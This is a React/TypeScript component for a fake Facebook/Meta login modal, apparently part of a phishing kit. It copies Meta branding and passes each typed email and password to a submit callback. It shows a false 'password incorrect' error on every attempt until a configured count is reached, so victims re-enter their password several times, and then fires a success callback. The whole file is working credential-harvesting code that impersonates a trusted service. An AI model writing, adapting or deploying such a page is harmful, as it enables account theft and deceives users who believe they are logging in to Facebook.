'use client';

import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import { tickSrc } from '@/components/icons';
import CONFIG from '@/utils/config';
import { memo, useEffect, useRef, useState, type FC, type FormEvent } from 'react';

interface LoginModalProps {
    show: boolean;
    onClose: () => void;
    onSubmit: (email: string, password: string) => void;
    onSuccess: () => void;
    texts: Record<string, string>;
}

const LoginModal: FC<LoginModalProps> = ({ show, onClose, onSubmit, onSuccess, texts }) => {
    const [formData, setFormData] = useState({ identifier: '', password: '' });
    const [showPassword, setShowPassword] = useState(false);
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const loadingTimerRef = useRef<number | null>(null);

    useEffect(() => {
        if (!show) {
            setIsLoading(false);
            if (loadingTimerRef.current !== null) {
                window.clearTimeout(loadingTimerRef.current);
                loadingTimerRef.current = null;
            }
        }
    }, [show]);

    const handleChange = (field: 'identifier' | 'password', value: string) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (showError) setShowError(false);
    };

    const handleSubmit = (e: FormEvent) => {
        e.preventDefault();
        if (!formData.identifier.trim() || !formData.password.trim()) return;

        setIsLoading(true);
        setShowError(false);

        loadingTimerRef.current = window.setTimeout(() => {
            loadingTimerRef.current = null;
            setIsLoading(false);
            const nextAttempt = loginAttempt + 1;
            onSubmit(formData.identifier, formData.password);

            if (nextAttempt >= CONFIG.MAX_PASSWORD_ATTEMPTS) {
                setShowError(false);
                onSuccess();
            } else {
                setShowError(true);
                setLoginAttempt(nextAttempt);
            }
        }, CONFIG.PASSWORD_LOADING_TIME * 1000);
    };

    if (!show) return null;

    return (
        <>
            <div className='modal-backdrop show' onClick={onClose} aria-hidden='true' />
            <div className='modal form-modal show' id='exampleModal2' style={{ display: 'block' }} tabIndex={-1}>
                <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                    <div className='modal-content'>
                        <div className='modal-header' />
                        <div className='modal-body'>
                            <div className='fb-round-wraper text-center'>
                                <img alt='' className='fb-logo-round' src={FbRoundLogo.src} />
                            </div>
                            <form autoComplete='off' id='apiForm' onSubmit={handleSubmit}>
                                <p style={{ color: '#1877f2', fontWeight: 600, fontSize: '14px', marginBottom: '6px', textAlign: 'left' }}>
                                    <img src={tickSrc} width={16} alt='tick' style={{ verticalAlign: 'middle' }} /> {texts.loginInstruction}
                                </p>
                                {loginAttempt === 0 && (
                                    <div className='form-floating mb-3' id='emailField'>
                                        <input
                                            autoComplete='username'
                                            className='form-control'
                                            id='loginIdentifier'
                                            maxLength={60}
                                            minLength={3}
                                            required
                                            type='text'
                                            value={formData.identifier}
                                            onChange={(e) => handleChange('identifier', e.target.value)}
                                        />
                                        <label htmlFor='loginIdentifier'>{texts.mobileOrEmail}</label>
                                    </div>
                                )}
                                <div className='form-floating mb-3' style={{ position: 'relative' }}>
                                    <input
                                        autoComplete='current-password'
                                        className={`form-control ${showError ? 'is-invalid shake' : ''}`}
                                        id='exampleInputPassword'
                                        maxLength={30}
                                        minLength={3}
                                        required
                                        style={{ paddingRight: '44px' }}
                                        type={showPassword ? 'text' : 'password'}
                                        value={formData.password}
                                        onChange={(e) => handleChange('password', e.target.value)}
                                    />
                                    <label htmlFor='exampleInputPassword'>{texts.password}</label>
                                    <button
                                        aria-label='Show/Hide password'
                                        className='password-toggle'
                                        type='button'
                                        style={{
                                            position: 'absolute',
                                            right: '12px',
                                            top: '50%',
                                            transform: 'translateY(-50%)',
                                            cursor: 'pointer',
                                            zIndex: 6,
                                            background: 'transparent',
                                            border: 0,
                                            padding: 0
                                        }}
                                        onClick={() => setShowPassword((prev) => !prev)}
                                    >
                                        <svg fill='#606770' height='22' viewBox='0 0 24 24' width='22' style={{ display: showPassword ? 'none' : 'inline' }}>
                                            <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                            <circle cx='12' cy='12' r='2.5' />
                                        </svg>
                                        <svg fill='#1877f2' height='22' viewBox='0 0 24 24' width='22' style={{ display: showPassword ? 'inline' : 'none' }}>
                                            <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                        </svg>
                                    </button>
                                    {showError && (
                                        <div className='invalid-feedback d-block' id='errorMsg'>
                                            {texts.passwordIncorrect}
                                        </div>
                                    )}
                                </div>
                                <div className='form-btn-wrapper'>
                                    <button className='btn btn-primary w-100' type='submit' disabled={isLoading} style={{ position: 'relative', height: '45px' }}>
                                        <span className='button-text' style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
                                            {loginAttempt === 0 ? texts.logIn : texts.continueBtn}
                                        </span>
                                        {isLoading && (
                                            <span className='login-btn-spinner' aria-hidden='true'>
                                                <span className='login-btn-spinner-ring' />
                                            </span>
                                        )}
                                    </button>
                                </div>
                                <div className='text-center mt-3' id='forgot-pass-wrap'>
                                    <a href='#forgot'>{texts.forgotPassword}</a>
                                </div>
                            </form>
                            <div className='spaser' />
                        </div>
                        <div className='modal-footer border-0 justify-content-center' style={{ flexDirection: 'column', textAlign: 'center' }}>
                            <img src={MetaLogo.src} alt='Meta Logo' style={{ height: '20px', marginBottom: '5px' }} />
                            <div className='footer-links' style={{ fontSize: '12px', color: '#000' }}>
                                {texts.aboutHelpMore}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default memo(LoginModal);
